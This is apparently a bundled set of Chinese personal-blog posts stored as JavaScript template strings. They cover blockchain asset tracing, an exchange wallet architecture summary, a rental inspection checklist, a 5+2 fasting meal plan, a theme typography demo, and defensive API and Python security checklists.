2. **扣除资产**：如果条件满足，合约会从你的账户中扣除购买代币的费用。
3. **转移资产**：合约将购买的代币转移到你的账户。
4. **记录交易**：所有的交易数据（比如转账金额、时间、交易双方）会被提交到区块链，其他用户也能查看这个交易。

通过这样的机制，Solidity 编写的智能合约能够自动处理所有资产的变动，并将其透明、公开地记录在区块链上，确保没有人能篡改或者隐瞒这些交易记录。

### 总结

是的，Solidity 编写的智能合约能够自动管理和记录资产的转移。所有的交易和资产变动都会被记录到区块链上，任何人都可以查询这些记录，确保透明性和不可篡改性。在你的购买过程中，合约会自动更新你的资产（例如余额减少），并将这些变动发布到区块链上，让所有参与者都能看到这些操作。

## 链上可以记录交易 初始用户的基本资产从哪来的？


然而，有一些方法可以间接了解用户资产的来源：

### 1. **区块链交易历史（链上追溯）**

- **通过链上地址追溯**：区块链是公开透明的，你可以查询一个钱包地址的交易历史，查看它收到的每一笔交易。例如，如果一个用户的钱包地址通过智能合约或其他用户收到了一笔资产转账，你可以查看这笔交易的来源地址，进一步追溯资金的来源。这种追溯过程可以追溯到该用户资产的最早来源。
- **链上钱包地址**：用户的钱包地址本身就是一个唯一标识。通过这个地址，你可以查看到所有相关的交易，包括转入和转出。这对于查找资金的来源非常有效。例如，你可以通过查找该地址的历史交易，追溯该钱包的资产来自何处（例如，来自某个交易所的充值，或者某个合约的奖励等）。

### 2. **智能合约和代币的发行**

- **合约逻辑**：当用户通过智能合约进行交易时，合约本身可能会记录资金的来源。例如，某些代币合约会记录代币的“发行”和“铸造”过程。在某些情况下，你可以通过查阅合约的代码和交易历史，找出用户资产（例如代币）的来源。
- **初始代币分发**：很多区块链项目在代币发行时会进行ICO（Initial Coin Offering）或空投（Airdrop），这些代币的来源可以追溯到发行合约。用户如果在某个特定的时刻参与了ICO或者收到空投，那些资产的来源可以在区块链上找到。

### 3. **Token Minting 与支付的来源**

- **代币铸造**：在去中心化应用（DApp）中，用户的资产可能通过代币铸造（minting）或购买（buying）获得。代币的来源通常通过智能合约中定义的规则来生成。例如，用户参与某个应用程序或游戏时，可能会通过完成任务、购买、参与流动性挖矿等方式获得资产（比如代币或NFT）。在这种情况下，合约会定义如何创建新资产并将其分配给用户。
- **合约中记录的来源**：某些合约会保存资产的来源，例如“通过某平台购买”、“通过某个合约奖励获得”或“通过参与某个活动”获得。

### 4. **第三方服务提供的交易历史**

- **交易所记录**：如果用户的资产来自中心化交易所（CEX），则交易所通常会记录用户的存取款历史。例如，如果用户从交易所充值了资产，交易所会记录该用户的充值交易。对于去中心化交易所（DEX），链上也会显示资金流动，但资金的初始来源（例如用户是否曾在某个中心化平台交易）通常不会直接显示在链上。
- **跨平台追踪**：在跨平台的操作中，例如一个用户从一个链上资产转到另一个链，资产的来源可以通过链上或跨链的桥接（bridge）协议进行追溯。

### 5. **合约事件与日志**

- **事件日志**：在智能合约中，通常会使用 \`event\` 来记录重要操作。通过这些事件日志，开发者和用户可以追踪资产的来源。例如，合约可以在发行代币时发出事件，表明资产的铸造和转账过程。这些事件日志可以在区块链浏览器（如 Etherscan）中查看，进一步帮助追溯资产的来源。

### 示例：代币转移与初始来源

假设一个用户从某个智能合约中购买了代币或资产，以下是这个过程的追溯方式：

1. **用户购买代币**：用户通过合约购买某种代币，合约会记录代币的发放，更新用户的余额。
2. **查看代币转账历史**：通过查看智能合约的交易历史（例如 ERC-20 代币的 \`Transfer\` 事件），你可以看到代币的发放来源、金额以及时间戳。
3. **追溯源头**：你还可以通过钱包地址追溯资金的来源。如果该用户的地址曾经接收到某个区块链钱包的充值或某个代币的发行，你可以继续追溯到源头。

### 总结

区块链的透明性让你能够追溯用户资产的来源，但这需要你查阅区块链上的交易记录、智能合约事件和代币的发行历史。对于资产的“初始来源”，你可能需要通过用户的交易历史来追溯，也可以通过合约逻辑了解资产如何生成或转移。尽管区块链上的数据是公开的，但智能合约和资产的来源通常是间接记录的，需要通过相关的交易和事件日志来进行追溯。

. 从中心化交易所（CEX）购买
如果你刚接触区块链和加密货币，最简单的方式是通过中心化交易所（如 Coinbase、Binance、KuCoin、OKEx 等）购买加密资产。这里是一个简要的步骤：

注册交易所账户：在一个中心化交易所注册账户，并进行身份验证（KYC）。
充值法币：将你的法币（例如 USD、EUR、CNY 等）存入交易所账户。通常可以通过银行转账、信用卡或其他支付方式进行充值。
购买加密货币：使用你的法币购买加密货币（如比特币 BTC、以太坊 ETH、USDT 稳定币等）。你可以选择通过市场价直接购买，或者设定价格购买。
提现到钱包：购买加密货币后，你可以将其从交易所提取到你的个人钱包中。这样，你可以将资产控制在自己手中，避免交易所的风险。
一旦你有了这些加密资产，就可以在去中心化平台或智能合约中进行交易或购买商品。

2. 从去中心化交易所（DEX）交换资产
去中心化交易所（如 Uniswap、Sushiswap、PancakeSwap）允许你无需中介即可直接与其他用户交换资产。以下是通过 DEX 交换资产的过程：

安装数字钱包：首先，你需要一个支持 Web3 的数字钱包（如 MetaMask、Trust Wallet 或 Coinbase Wallet）。
连接钱包：将你的钱包与 DEX 连接。一般来说，去中心化交易所会提供一个“连接钱包”的按钮，点击后选择你的钱包。
获取加密资产：你可以使用你的现有加密货币（如 ETH 或 USDT）交换其他资产（如你想购买的代币）。比如，你可以通过 Uniswap 用 ETH 交换代币。
进行交易：在 DEX 上找到你想交易的资产对，并提交交易。交易成功后，资产将直接转入你的钱包。
3. 参与去中心化金融（DeFi）平台
如果你已经拥有一些加密资产，并希望通过去中心化平台赚取更多资产（例如通过质押、借贷等方式），你可以参与 DeFi 服务。这些平台通常允许用户通过质押加密资产来获得利息或奖励代币，间接为你提供更多资产。

使用 DeFi 协议：例如，你可以使用 Compound、Aave、Yearn 等 DeFi 协议，将你的加密资产存入这些平台，获取利息或代币奖励。
借贷资产：你还可以通过 DeFi 借贷平台借取加密资产。例如，Aave 和 Compound 都允许你将加密货币作为抵押品进行借款。
4. 参加空投（Airdrop）
一些新兴的加密项目会通过空投向用户免费赠送代币。这些代币可以用来购买商品、服务或参与 DeFi 操作。空投通常需要你完成一些简单的任务，如关注社交媒体账号、加入社区、参与测试网等。

关注空投项目：你可以关注一些加密货币的空投网站（例如 AirdropAlert、CoinMarketCap 的 Airdrop 页面等），查看有哪些新项目正在进行空投。
参与任务：根据项目要求参与空投任务，完成任务后，你将获得免费的代币。
5. 工作赚取加密资产
一些平台和个人雇主提供加密货币支付，允许你通过工作赚取加密资产。你可以为提供加密货币支付的公司或平台提供服务（例如编程、设计、写作等），赚取比特币、以太坊等加密货币。

寻找加密货币工作：可以通过网站如 CryptoJobs、Freelancer、Upwork 等找到加密货币支付的工作。
6. 通过挖矿获得资产
如果你具备一定的技术条件和硬件设备，也可以通过挖矿来获取加密资产。挖矿是通过为区块链网络提供计算力，帮助验证交易并产生新区块来获得奖励的过程。

选择挖矿项目：常见的挖矿项目包括比特币、以太坊（ETH）等。你需要配置矿机并选择适合的挖矿池来参与。
加入矿池：如果你不是独立矿工，你可以加入矿池。矿池会将多个矿工的计算力合并，共同挖掘区块，并根据贡献的计算力分配奖励。
7. 使用信用卡购买加密资产
如果你希望快速获得初始资产并直接购买加密货币，一些平台允许你通过信用卡购买加密货币。例如，Coinbase、Binance 和其他平台支持通过信用卡或借记卡购买比特币、以太坊等加密货币。

选择信用卡支付平台：选择一个支持信用卡购买加密资产的平台，注册并验证你的身份，然后直接使用信用卡购买你需要的资产。
`,Ge=`---
title: 标准工作流程
date: 2025-09-19
tags: [Work, Productivity]
---

![alt text](../../assets/img/2025/image.png)`,je=`---
title: 交易所钱包系统的开发设计
date: 2025-09-19
tags: [Web3, BlockChain]
---

## 参考文章

钱包设计方案

1. https://learnblockchain.cn/article/20345

2. https://learnblockchain.cn/article/20693


这篇文章《交易所钱包系统开发 #1 - 系统设计》详细介绍了如何设计一个安全且高效的加密货币托管系统，特别是针对交易所钱包的架构。以下是文章的核心要点总结：

---

### 🧱 初步设计：基本架构
- **核心模块**：
  - 充值服务（Deposit Service）：监听区块链交易，确认用户充值。
  - 提现服务（Withdrawal Service）：处理用户提现请求，签名并广播交易。
- **功能流程**：
  - 用户充值 → 区块链确认 → 充值服务记录余额。
  - 用户提现 → 提现服务签名 → 区块链确认 → 更新余额。

![alt text](../../assets/img/2025/image-7.png)

![alt text](../../assets/img/2025/image-6.png)
---

### 🔐 设计二：加入签名机与资金调度
- **签名机**：用于生成用户地址并保存私钥，隔离网络以提高安全性。
- **资金调度服务**：自动在不同钱包之间划转资金，分级管理：
  - 用户钱包 → 热钱包 → T2 多签钱包 → T1 多签钱包。
- **目的**：提高资金安全性，防止单点故障。
![alt text](../../assets/img/2025/image-5.png)
---

### 🛡️ 设计三：加入风控模块
- **KYC（了解你的客户）**：用户注册或提现时进行身份验证。
- **风控功能**：
  - 检查充值来源地址是否为黑名单。
  - 检查提现目标地址是否为黑名单。
- **流程控制**：风控通过后才允许更新余额或进行提现签名。
  
![alt text](../../assets/img/2025/image-4.png)

---

### 🧠 设计四：独立风控系统
- **独立运行**：风控系统不依赖业务系统，独立验证充值和提现数据。
- **双重签名验证**：提现需业务端签名 + 风控确认后再由签名机签名。
- **模块职责清晰**：各模块只能在权限范围内操作，提升系统安全性。

![add risk control](../../assets/img/2025/image-3.png)

---

### 🔧 安全与扩展建议
- 使用 CloudHSM、KMS+TEE 或 MPC 等技术提升私钥安全。
- 所有操作记录日志，便于审计与追溯。
- 多签钱包可根据资金量设置更多级别。

---

这篇文章为构建交易所钱包系统提供了一个逐步演进的设计框架，从基础功能到高级安全机制，适合开发者参考和实际部署。如果你想深入了解某一部分，我可以帮你拆解或举例说明。


`,Ve=`---
title: 租房检查checklist
date: 2025-11-27
tags: [Life,Checklist]
---

# 租房检查单

## 看房前

- **携带地线检查器；**
- 卷尺？

## 签约前

- 协商 快到期了看房问题（需不需要人在家，到期前多久要配合看房）
- 买卖不破租赁？
- 转租条款；
- 能否办理居住证，注册地址、备案等？
- 损坏，家具更换如何处理？物品价格清单
- 询问是否可以更换电器窗帘，可以养宠物？
- 可否养宠物（写进合同）
- 检查房屋抵押/贷款/法院查封状态
- 检查合同（ AI review ）: 自然老化不赔，买卖不破租赁，水电前任租客账单，甲方对合同享有合法出租权，因产权纠纷造成乙方损失…。 警惕绝对词。
- 退租以后多久房东查房 + 退押金？（写进合同）
- 有哪些其他收费？水电网物业垃圾？如何收费？民水民电？

## 看房检查

### 电器

- [ ]  空调好用不好用，制热制冷模式都可以吗？足够凉吗。开太久漏水吗？有异味吗?
- [ ]  热水器？燃气热水器热水器最好 16L 每分钟以上；电热水器检查水垢；
- [ ]  电器是否工作正常（冰箱，洗衣机，热水器）？噪声？水垢？结霜？
    - [ ]  洗衣机空转检查漏水；烘干检查是否会报错误码；
    - [ ]  烤箱 热水器 微波炉 同时开最大检查是否跳闸；

### 水

- [ ]  有无漏水地方（空调开太久滴水、楼上滴水、水管滴水、下雨窗沿渗水）
- [ ]  马桶冲水大小按钮，各水池上下水如何，通畅吗？
- [ ]  喷头水压是否足够大？
- [ ]  下水道是否返臭
- [ ]  水池地漏功能检查，下水道是否在低位，**尤其检查卫生间（可能存在地漏高于其他地方，洗澡后不下水问题）**

### 电

- [ ]  电线隐患？裸露电线、不正确的接线。（地线检查器）
- [ ]  漏电保护器是否可用（按一下空气开关旁边的测试按钮）。
- [ ]  测电笔 中性点 零线电压

### 房

- [ ]  阳台封闭吗？晾衣服会不会被风吹，宠物友好(有掉落风险)吗？
- [ ]  有无摄像头，双面镜？
- [ ]  隔音？除了马路上的隔音，楼上楼下之间会有走动的声音吗？隔音 okay 吗？
- [ ]  门锁是否正常？好不好锁上，能彻底反锁吗？
- [ ]  **小区门禁如何？外卖、快递进来如何进来，到门口还是到驿站？**
- [ ]  搬家是否方便（电梯？搬家车是否可以在楼下搬，还是车停很远）
- [ ]  密码锁更换/测试，换电池，重置。
- [ ]  天然气/烟道返气吗？
- [ ]  所有抽屉、衣柜、活动件测试。 窗户把手松紧度检查

### 卫生

- [ ]  死角、床垫下、沙发罩下、冰箱后面的缝隙等是否有血渍、虫子？
- [ ]  **地毯下方是否有污渍？**

### 网络

- [ ]  网络哪些运营商可以接入？
- [ ]  网线口可用吗，要不要过福禄克？

### 车

- [ ]  停车位多少钱，如何办理？是否有特定条件（比如行驶证必须和业主同名）
- [ ]  访客可以停车吗？

## 看房后

### 搬家前

- 箱子（德国纸箱不需要封底 / 考虑带扣手）
    - 60cm x 40cm x 50cm :可能有点大
    - 40cm x 30cm x 30cm：
- 真空袋子
- **找物业开出门放行条**

### 入住前

- 除虫，喷洒杀虫剂；
- 房子污渍问题不可用的电器等拍照记录留档
- 入住之前打扫卫生或者家政
- 管道疏通剂把各个地漏下水道洗消
- 床用床笠挡一下防水防姨妈
- 智能锁、 钟表换全新电池；
- **空调**/热水器/**洗衣机**/油烟机/**冰箱**清洗；
- 窗帘地毯沙发是否清洗？

### 入住后

- 修改房补地址
- 个人所得税租房补贴地址
- 居住登记地址
- 购买租房保险？

## 其他

### 搬家思路

- 德国纸箱不用封底
- 最好带扣手；
- 保鲜膜 + 真空包60cm x 40cm x 50cm 常规搬家箱子,可以装：
- 小面 8 箱
- 中面 15 - 20 箱
- 依维柯 30 - 34 箱

40cm x 30cm x 30cm 小东西`,Qe=`---
title: "MyBurpsuite"
date: "2025-09-14"
tags: ["intro","burp"]
---

# Hello

这是 **Markdown** 示例。支持表格、任务列表、代码高亮等。

### Introude






`,ze=`---
title: 5+2 轻断食 
date: 2025-09-17
tags: [Life,Health]
---

“5+2 轻断食”是一种比较流行的间歇性断食法（Intermittent Fasting, IF），特点是 一周 7 天里 5 天正常饮食，2 天轻度限制热量。

⸻


具体做法
	•	5 天：正常饮食，不需要特别限制（但最好保持均衡、少油少糖）。
	•	2 天：非连续（比如周二、周五），每日热量摄入控制在 500–600 大卡 左右：
	•	女性约 500 kcal
	•	男性约 600 kcal
	•	在这 2 天里，推荐多吃高蛋白（鸡胸肉、鱼、蛋清、豆腐）、高纤维蔬菜，少量健康脂肪（橄榄油、牛油果）。
	•	水、茶、黑咖啡基本不限。

⸻

⚖️ 好处（研究和实践中常见）
	•	有助 减重：总体热量摄入下降，促进脂肪消耗。
	•	改善 胰岛素敏感性，有助控制血糖。
	•	一定程度上改善 血脂、血压。
	•	有研究提示可能延缓衰老，提升细胞修复（自噬机制）。

⸻

⚠️ 风险与注意事项
	•	轻断食不适合：孕妇、哺乳期、青少年、糖尿病患者（需用药控制）、胃肠疾病患者。
	•	可能副作用：低血糖、头晕、疲劳、暴食反弹、胃部不适。
	•	不建议在断食日做高强度运动，可以选择散步、瑜伽、轻度拉伸。

⸻

🛠️ 小技巧
	•	断食日把热量分配成 2 餐（比如午餐 300 kcal + 晚餐 200 kcal）。
	•	多喝水、无糖茶，可以缓解饥饿感。
	•	断食日不要安排需要大量脑力/体力的活动。

⸻

要不要我帮你做一个 “5+2 轻断食 一周饮食示例表（含卡路里计算）”？这样你可以直接拿来照着执行。


好的 ✅
下面给你一份 5+2 轻断食一周饮食示例表（以成年男性 600 kcal / 断食日，女性可在每餐少 50 kcal 左右做调整）。

⸻

📅 一周示例计划（5+2 轻断食）

周一（正常日）
	•	早餐：燕麦牛奶 + 水煮蛋 2 个 + 苹果
	•	午餐：米饭 + 清蒸鸡胸肉 + 西兰花炒蘑菇
	•	晚餐：牛肉蔬菜汤 + 全麦面包
（正常均衡饮食即可）

⸻

周二（断食日，约 600 kcal）
	•	午餐（约 300 kcal）：
	•	烤鸡胸肉 100g（150 kcal）
	•	生菜沙拉（黄瓜、西红柿，橄榄油少许）100g（80 kcal）
	•	半个水煮蛋（35 kcal）
	•	晚餐（约 300 kcal）：
	•	清蒸鱼 100g（150 kcal）
	•	西兰花 100g（34 kcal）
	•	冬瓜汤一小碗（40 kcal）
	•	一个猕猴桃（60 kcal）

⸻

周三（正常日）
	•	早餐：全麦吐司 + 花生酱 + 脱脂牛奶
	•	午餐：米饭 + 红烧牛肉 + 炒青菜
	•	晚餐：荞麦面 + 豆腐 + 海带汤

⸻

周四（正常日）
	•	早餐：酸奶 + 蓝莓 + 燕麦
	•	午餐：米饭 + 清蒸鱼 + 西兰花
	•	晚餐：番茄鸡蛋汤 + 全麦馒头 + 蔬菜

⸻

周五（断食日，约 600 kcal）
	•	午餐（约 280 kcal）：
	•	烤虾仁 100g（90 kcal）
	•	芦笋炒蘑菇 100g（60 kcal）
	•	番茄 1 个（25 kcal）
	•	半个苹果（50 kcal）
	•	晚餐（约 320 kcal）：
	•	豆腐炖青菜 150g（100 kcal）
	•	煮南瓜 100g（66 kcal）
	•	紫菜蛋花汤一小碗（40 kcal）
	•	橙子 1 个（110 kcal）

⸻

周六（正常日）
	•	早餐：鸡蛋煎饼 + 牛奶
	•	午餐：米饭 + 烤三文鱼 + 蔬菜沙拉
	•	晚餐：炒米粉 + 青菜 + 牛肉片

⸻

周日（正常日）
	•	早餐：玉米 + 豆浆
	•	午餐：米饭 + 红烧鸡翅 + 炒菠菜
	•	晚餐：杂粮粥 + 豆腐 + 凉拌海带丝

⸻

🛡️ 注意
	•	断食日：总热量 ≤ 500–600 kcal，蛋白质优先，搭配蔬菜水果，避免油炸和高糖。
	•	正常日：不要暴饮暴食，保持规律、均衡。
	•	多喝水、茶、黑咖啡（无糖），帮助缓解饥饿感。
	•	建议配合 轻度运动（走路、瑜伽、拉伸）。

⸻
`,qe=`---
title: "最佳实践输出"
date: 2025-09-18
categories: [write, output]
---

# 写作软件vscode

## 配置

1. snippet
2. image target folder
3. extension  \`markdown all in one\`

## 字体推荐

1. Fira Code

![alt text](../assets/img/image-123.png)


\`\`\`python
def get_sum (a: int, b:int)->int:
    return a+b
\`\`\`

this is python`,Ke=`---
title: mcpserver安全测试流程
date: 2025-09-19
tags: [mcp]
---

`,Xe=`---
title: Text and Typography
description: Examples of text, typography, math equations, diagrams, flowcharts, pictures, videos, and more.
author: cotes
date: 2025-09-19
categories: [Blogging, Demo]
tags: [typography]
pin: true
math: true
mermaid: true
image:
  path: /commons/devices-mockup.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Responsive rendering of Chirpy theme on multiple devices.
---

## Headings

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
# H1 — heading
{: .mt-4 .mb-0 }

## H2 — heading
{: data-toc-skip='' .mt-4 .mb-0 }

### H3 — heading
{: data-toc-skip='' .mt-4 .mb-0 }

#### H4 — heading
{: data-toc-skip='' .mt-4 }
<!-- markdownlint-restore -->

## Paragraph

Quisque egestas convallis ipsum, ut sollicitudin risus tincidunt a. Maecenas interdum malesuada egestas. Duis consectetur porta risus, sit amet vulputate urna facilisis ac. Phasellus semper dui non purus ultrices sodales. Aliquam ante lorem, ornare a feugiat ac, finibus nec mauris. Vivamus ut tristique nisi. Sed vel leo vulputate, efficitur risus non, posuere mi. Nullam tincidunt bibendum rutrum. Proin commodo ornare sapien. Vivamus interdum diam sed sapien blandit, sit amet aliquam risus mattis. Nullam arcu turpis, mollis quis laoreet at, placerat id nibh. Suspendisse venenatis eros eros.

## Lists

### Ordered list

1. Firstly
2. Secondly
3. Thirdly

### Unordered list

- Chapter
  - Section
    - Paragraph

### ToDo list

- [ ] Job
  - [x] Step 1
  - [x] Step 2
  - [ ] Step 3

### Description list

Sun
: the star around which the earth orbits

Moon
: the natural satellite of the earth, visible by reflected light from the sun

## Block Quote

> This line shows the _block quote_.

## Prompts

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> An example showing the \`tip\` type prompt.
{: .prompt-tip }

> An example showing the \`info\` type prompt.
{: .prompt-info }

> An example showing the \`warning\` type prompt.
{: .prompt-warning }

> An example showing the \`danger\` type prompt.
{: .prompt-danger }
<!-- markdownlint-restore -->

## Tables

| Company                      | Contact          | Country |
| :--------------------------- | :--------------- | ------: |
| Alfreds Futterkiste          | Maria Anders     | Germany |
| Island Trading               | Helen Bennett    |      UK |
| Magazzini Alimentari Riuniti | Giovanni Rovelli |   Italy |

## Links

<http://127.0.0.1:4000>

## Footnote

Click the hook will locate the footnote[^footnote], and here is another footnote[^fn-nth-2].

## Inline code

This is an example of \`Inline Code\`.

## Filepath

Here is the \`/path/to/the/file.extend\`{: .filepath}.

## Code blocks

### Common

\`\`\`text
This is a common code snippet, without syntax highlight and line number.
\`\`\`

### Specific Language

\`\`\`bash
if [ $? -ne 0 ]; then
  echo "The command was not successful.";
  #do the needful / exit
fi;
\`\`\`

### Specific filename

\`\`\`sass
@import
  "colors/light-typography",
  "colors/dark-typography";
\`\`\`
{: file='_sass/jekyll-theme-chirpy.scss'}

## Mathematics

The mathematics powered by [**MathJax**](https://www.mathjax.org/):

$$
\\begin{equation}
  \\sum_{n=1}^\\infty 1/n^2 = \\frac{\\pi^2}{6}
  \\label{eq:series}
\\end{equation}
$$

We can reference the equation as \\eqref{eq:series}.

When $a \\ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are

$$ x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a} $$

## Mermaid SVG

\`\`\`mermaid
 gantt
  title  Adding GANTT diagram functionality to mermaid
  apple :a, 2017-07-20, 1w
  banana :crit, b, 2017-07-23, 1d
  cherry :active, c, after b a, 1d
\`\`\`

## Images

### Default (with caption)

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" }
_Full screen width and center alignment_

### Left aligned

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" .w-75 .normal}

### Float to left

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" .w-50 .left}
Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum.

### Float to right

![Desktop View](/posts/20190808/mockup.png){: width="972" height="589" .w-50 .right}
Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum.

### Dark/Light mode & Shadow

The image below will toggle dark/light mode based on theme preference, notice it has shadows.

![light mode only](/posts/20190808/devtools-light.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/posts/20190808/devtools-dark.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

## Video

{% include embed/youtube.html id='Balreaj8Yqs' %}

## Reverse Footnote

[^footnote]: The footnote source
[^fn-nth-2]: The 2nd footnote source`,Je="---\ntitle: API安全检查项\ndate: 2025-11-27\ntags: [API安全, Checklist]\n---\n\n**身份认证**\n\n- [ ]  不要使用 `Basic Auth` ，请使用标准的认证协议（如 [JWT](https://jwt.io/)，[OAuth](https://oauth.net/)）。\n- [ ]  不要重新实现 `Authentication`、`token generating` 和 `password storage`，请使用标准库。\n- [ ]  限制密码错误尝试次数，并且增加账号冻结功能。\n- [ ]  密码或账号登录失败时返回模糊的提示信息，防止暴力破解攻击。\n- [ ]  加密所有的敏感数据。\n- [ ]  不要将API Key，云组件Key等硬编码到前端页面或APP中。\n- [ ]  使用开源框架时禁止使用默认Key，比如Shiro。\n\n**JWT（JSON Web Token）**\n\n- [ ]  使用随机复杂的密钥（`JWT Secret`）以增加暴力破解的难度。\n- [ ]  不要在请求体中直接提取数据，要对数据进行加密（`HS256` 或 `RS256`）。\n- [ ]  使 token 的过期时间尽量的短（`TTL`，`RTTL`）。\n- [ ]  不要在 JWT 的请求体中存放敏感数据，因为它是[可解码的](https://jwt.io/#debugger-io)。\n- [ ]  避免存储过多的数据。 JWT 通常在标头中共享，并且它们有大小限制。\n\n**访问**\n\n- [ ]  限制流量来防止 DDoS 攻击和暴力攻击。\n- [ ]  对API接口访问进行速率限制防止业务数据被批量爬取。\n- [ ]  在服务端使用 HTTPS 协议来防止 MITM （中间人攻击）。\n- [ ]  使用 `HSTS` 协议防止 SSL Strip 攻击。\n- [ ]  关闭目录列表。\n- [ ]  禁止公开存储文件列表可未授权访问。\n- [ ]  对于私有 API，仅允许从列入白名单的 IP/主机进行访问。\n- [ ]  禁止将内部组件接口、登录管理接口暴露于公网中。\n- [ ]  禁止将SourceMap文件暴露到公网中。\n- [ ]  禁止将API接口描述文档暴露到公网中。\n\n**Authorization**\n\n**OAuth 授权或认证协议**\n\n- [ ]  始终在后台验证 `redirect_uri`，只允许白名单的 URL。\n- [ ]  始终在授权时使用有效期较短的授权码（code）而不是令牌（access_token）（不允许 `response_type=token`）。\n- [ ]  使用随机哈希数的 `state` 参数来防止跨站请求伪造（CSRF）。\n- [ ]  对不同的应用分别定义默认的作用域和各自有效的作用域参数。\n\n**输入**\n\n- [ ]  使用与操作相符的 HTTP 操作函数，`GET（读取)`，`POST（创建）`，`PUT（替换/更新）` 以及 `DELETE（删除记录）`，如果请求的方法不适用于请求的资源则返回 `405 Method Not Allowed`。\n- [ ]  在请求头中的 `content-type` 字段使用内容验证来只允许支持的格式（如 `application/xml`，`application/json` 等等）并在不满足条件的时候返回 `406 Not Acceptable`。\n- [ ]  验证 `content-type` 中申明的编码和你收到正文编码一致（如 `application/x-www-form-urlencoded`，`multipart/form-data`，`application/json` 等等）。\n- [ ]  验证用户输入来避免一些普通的易受攻击缺陷（如 `XSS`，`SQL-注入`，`远程代码执行` 等等）。\n- [ ]  不要在 URL 中使用任何敏感的数据（`credentials`，`Passwords`，`security tokens`，or `API keys`），而是使用标准的认证请求头。\n- [ ]  仅使用服务器端加密。\n- [ ]  使用一个 API Gateway 服务来启用缓存、限制访问速率（如 `Quota`，`Spike Arrest`，`Concurrent Rate Limit`）以及动态地部署 APIs resources。\n\n**处理**\n\n- [ ]  检查是否所有的接口都包含必要都身份认证，以避免被破坏了的认证体系。\n- [ ]  避免使用特有的资源 id。使用 `/me/orders` 替代 `/user/654321/orders`。\n- [ ]  使用 `UUID` 代替自增长的 id。\n- [ ]  对于访问资源进行权限检查，防止横向越权。\n- [ ]  如果需要解析 XML 文件，确保实体解析（entity parsing）是关闭的以避免 `XXE` 攻击。\n- [ ]  如果需要解析 XML 文件，确保实体扩展（entity expansion）是关闭的以避免通过指数实体扩展攻击实现的 `Billion Laughs/XML bomb`。\n- [ ]  在文件上传中使用 CDN。\n- [ ]  如果数据处理量很大，尽可能使用队列或者 Workers 在后台处理来避免阻塞请求，从而快速响应客户端。\n- [ ]  不要忘了把 DEBUG 模式关掉。\n- [ ]  可用时使用不可执行的堆栈。\n- [ ]  禁止使用类似于PHP `extract`函数将接口输入参数转换为变量。\n\n**输出**\n\n- [ ]  增加请求返回头 `X-Content-Type-Options: nosniff`。\n- [ ]  增加请求返回头 `X-Frame-Options: deny`。\n- [ ]  增加请求返回头 `Content-Security-Policy: default-src 'none'`。\n- [ ]  删除请求返回中的指纹头 - `X-Powered-By`，`Server`，`X-AspNet-Version` 等等。\n- [ ]  在响应中遵循请求的 `content-type`，如果你的请求类型是 `application/json` 那么你返回的 `content-type` 就是 `application/json`。\n- [ ]  不要返回敏感的数据，如 `credentials`，`Passwords`，`security tokens`。\n- [ ]  给请求返回使用合理的 HTTP 响应代码。（如 `200 OK`，`400 Bad Request`，`401 Unauthorized`，`405 Method Not Allowed` 等等）。\n- [ ]  返回统一的错误页面，误将调用堆栈等信息在错误页面中展示。\n- [ ]  仅返回前端需要的业务数据，禁止返回过多类型敏感数据。\n- [ ]  前端对敏感业务数据使用时应结合业务需求对敏感数据进行脱敏。\n- [ ]  禁止在前端对数据进行脱敏，数据返回时在后端进行脱敏。\n\n**持续集成和持续部署**\n\n- [ ]  使用单元测试以及集成测试的覆盖率来保障你的设计和实现。\n- [ ]  引入代码审查流程，禁止私自合并代码。\n- [ ]  在推送到生产环境之前确保服务的所有组件都用杀毒软件静态地扫描过，包括第三方库和其它依赖。\n- [ ]  对您的代码持续运行安全测试（静态/动态分析）。\n- [ ]  检查您的依赖项（软件和操作系统）是否存在已知漏洞。\n- [ ]  为部署设计一个回滚方案。\n\n**监控**\n\n- [ ]  对所有服务和组件使用集中式登录。\n- [ ]  使用代理来监控所有流量、错误、请求和响应。\n- [ ]  使用短信，Slack，电子邮件，电报，Kibana, Cloudwatch等提醒。\n- [ ]  确保你没有记录任何敏感数据，如信用卡、密码、pin等。\n- [ ]  使用IDS和/或IPS系统监视您的API请求和实例。\n- [ ]  使用API检测设备进行API资产梳理、日志审计。",Ye=`---
title: Python安全检查项
date: 2025-11-29
tags: [Python, Checklist, Security]
---


https://snyk.io/blog/python-security-best-practices-cheat-sheet/

## Python 安全开发检查清单

- [ ]  **清洗所有外部输入数据**
    
    避免注入、XSS、DoS 等风险。使用 \`schema\`、\`bleach\`、Flask/Django 提供的转义函数等工具。
    
